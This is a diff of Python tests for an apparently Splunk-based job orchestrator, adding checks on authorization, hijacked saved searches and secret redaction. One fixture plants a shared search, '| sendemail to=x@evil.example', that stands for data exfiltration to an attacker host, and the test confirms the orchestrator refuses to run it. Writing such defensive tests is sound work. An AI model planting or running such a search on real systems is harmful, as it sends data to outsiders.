@@ -265,7 +265,7 @@ def test_start_job_inherits_scheduled_time():
 def test_authz_can_run():
     from so.authz import can_run
     job = {"owner": "o", "run_roles": ["ops"]}
-    assert can_run("o", job, [], [])
+    assert can_run("o", job, [], ["orchestrator_run"]) and not can_run("o", job, [], [])
     assert can_run("x", job, [], ["orchestrator_admin"])
     assert can_run("x", job, ["ops"], ["orchestrator_run"])
     assert not can_run("x", job, ["ops"], [])
@@ -849,3 +849,26 @@ def test_event_action_sets_source_sourcetype_host_and_time():
     args = w.gw.dispatch_log[-1]["args"]
     assert args["sourcetype"] == "orch:event" and args["time"] == str(T - 100)
     assert "host" not in args
+
+
+
+def test_alert_search_replaced_by_someone_elses_shared_search_is_not_run():
+    w = W(actions=[{"hook": "on_failure", "type": "email", "to": "a@b.c"}])
+    w.gw.upsert_saved_search("mallory", "_so_j_action_0", "| sendemail to=x@evil.example", "", "")
+    w.gw.saved_searches[("mallory", "_so_j_action_0")]["sharing"] = "global"
+    w.submit()
+    w.pump()
+    assert not w.gw.dispatch_log
+    row = w.rows(kind="action")[0]
+    assert row["state"] == "failed" and "mallory" in row["error"]
+
+
+def test_header_values_never_reach_the_error_text():
+    w = W(actions=[WEBHOOK])
+    w.gw.secrets["ops_hdr"] = json.dumps({"Authorization": "Bearer TOPSECRET\n"})
+    w.gw.post_webhook = lambda url, h, b: (_ for _ in ()).throw(
+        ValueError("Invalid header value %r" % h["Authorization"].encode()))
+    w.submit()
+    w.pump()
+    blob = json.dumps(w.audit.events) + json.dumps(w.rows())
+    assert "TOPSECRET" not in blob and "[secret]" in blob
